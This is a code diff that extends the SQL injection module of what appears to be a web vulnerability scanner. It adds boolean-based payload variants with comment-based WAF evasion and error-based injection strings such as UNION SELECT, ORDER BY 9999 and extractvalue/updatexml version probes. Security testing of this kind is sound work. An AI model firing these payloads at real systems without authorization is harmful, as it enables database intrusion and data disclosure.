@@ -277,18 +277,34 @@ DBMS_ERROR_PATTERNS = {
 
 
 def generate_boolean_payloads(_: Request, __: Parameter) -> Iterator[PayloadInfo]:
-    # payloads = []
-    for use_parenthesis in (False, True):
-        for separator in ("", "'", "\""):
-            yield from generate_boolean_test_values(separator, use_parenthesis)
-    # return payloads
+    # nesting_level: 0 = no parenthesis, 1 = single ), 2 = double ))
+    # Covers subqueries nested up to 2 levels deep (common in CMS/frameworks)
+    for nesting_level in range(3):
+        # Added backtick separator for MySQL column/table name contexts
+        for separator in ("", "'", "\"", "`"):
+            yield from generate_boolean_test_values(separator, nesting_level, "AND", " ")
+            # OR-based variants to cover different WHERE clause structures
+            yield from generate_boolean_test_values(separator, nesting_level, "OR", " ")
+            # Comment-based space bypass (WAF evasion)
+            yield from generate_boolean_test_values(separator, nesting_level, "AND", "/**/")
 
 
-def generate_boolean_test_values(separator: str, parenthesis: bool) -> Iterator[PayloadInfo]:
+def generate_boolean_test_values(
+    separator: str,
+    nesting_level: int = 0,
+    operator: str = "AND",
+    space: str = " ",
+) -> Iterator[PayloadInfo]:
+    s = space  # shorthand for the space/comment separator
+    closing = ")" * nesting_level
+    opening = "(" * nesting_level
+
     fmt_string = (
-        "[VALUE]{sep} AND {left_value}={right_value} AND {sep}{padding_value}{sep}={sep}{padding_value}",
-        "[VALUE]{sep}) AND {left_value}={right_value} AND ({sep}{padding_value}{sep}={sep}{padding_value}"
-    )[parenthesis]
+        f"[VALUE]{{sep}}{closing}{s}{operator}{s}{{left_value}}={{right_value}}{s}{operator}{s}"
+        f"{opening}{{sep}}{{padding_value}}{{sep}}={{sep}}{{padding_value}}"
+    )
+
+    platform_tag = f"n{nesting_level}_{separator}_{operator}_{space}"
 
     for __ in range(2):
         value1 = randint(10, 99)
@@ -304,7 +320,7 @@ def generate_boolean_test_values(separator: str, parenthesis: bool) -> Iterator[
                 sep=separator
             ),
             section=False,
-            platform=f"{'p' if parenthesis else ''}_{separator}",
+            platform=platform_tag,
         )
 
     for __ in range(2):
@@ -320,7 +336,7 @@ def generate_boolean_test_values(separator: str, parenthesis: bool) -> Iterator[
                 sep=separator,
             ),
             section=True,
-            platform=f"{'p' if parenthesis else ''}_{separator}",
+            platform=platform_tag,
         )
 
 
@@ -371,7 +387,33 @@ class ModuleSql(Attack):
     """
     time_to_sleep = 6
     name = "sql"
-    payloads = ["[VALUE]\xBF'\"("]
+    payloads = [
+        # Original payload: multi-byte GBK encoding bypass + quotes + parenthesis
+        "[VALUE]\xBF'\"(",
+        # Backtick for MySQL column/table name context
+        "[VALUE]`",
+        # Nested parentheses closure (common in subqueries)
+        "[VALUE]'))",
+        "[VALUE]\"))",
+        # Comment-based truncation payloads
+        "[VALUE]'--",
+        "[VALUE]\"--",
+        "[VALUE]'#",
+        # Numeric context injection (no quotes needed)
+        "[VALUE] AND 1=CONVERT(int,@@version)--",
+        # UNION-based error payloads (type mismatch forces error disclosure)
+        "[VALUE]' UNION SELECT NULL--",
+        "[VALUE]\" UNION SELECT NULL--",
+        # ORDER BY with out-of-range index (triggers column count error)
+        "[VALUE]' ORDER BY 9999--",
+        "[VALUE]\" ORDER BY 9999--",
+        # Division by zero (arithmetic error disclosure)
+        "[VALUE]/0",
+        "[VALUE]' AND 1/0--",
+        # Oracle XML error-based (extractvalue / updatexml)
+        "[VALUE]' AND extractvalue(1,concat(0x7e,version()))--",
+        "[VALUE]' AND updatexml(1,concat(0x7e,version()),1)--",
+    ]
     filename_payload = "'\"("  # TODO: wait for https://github.com/shazow/urllib3/pull/856 then use that for files upld
     parallelize_attacks = True
 
@@ -480,9 +522,9 @@ class ModuleSql(Attack):
             good_response = await self.crawler.async_send(request)
             good_status = good_response.status
             good_redirect = good_response.redirection_url
-            # good_title = response.title
             html = Html(good_response.content, request.url)
             good_hash = html.text_only_md5
+            good_length = len(good_response.content)
         except ReadTimeout:
             self.network_errors += 1
             return
@@ -571,11 +613,19 @@ class ModuleSql(Attack):
                 test_results.append(False)
                 continue
 
-            Html(response.content, url=mutated_request.url)
+            resp_html = Html(response.content, url=mutated_request.url)
+            resp_length = len(response.content)
+            # Use content length similarity (±5%) as secondary heuristic
+            # to reduce false negatives when dynamic content changes the hash
+            length_ratio = abs(resp_length - good_length) / max(good_length, 1)
+            length_similar = length_ratio < 0.05
+
             comparison = (
                     response.status == good_status and
-                    response.redirection_url == good_redirect and
-                    Html(response.content, url=mutated_request.url).text_only_md5 == good_hash
+                    response.redirection_url == good_redirect and (
+                        resp_html.text_only_md5 == good_hash or
+                        length_similar
+                    )
             )
 
             test_results.append(comparison == (payload_info.section is True))
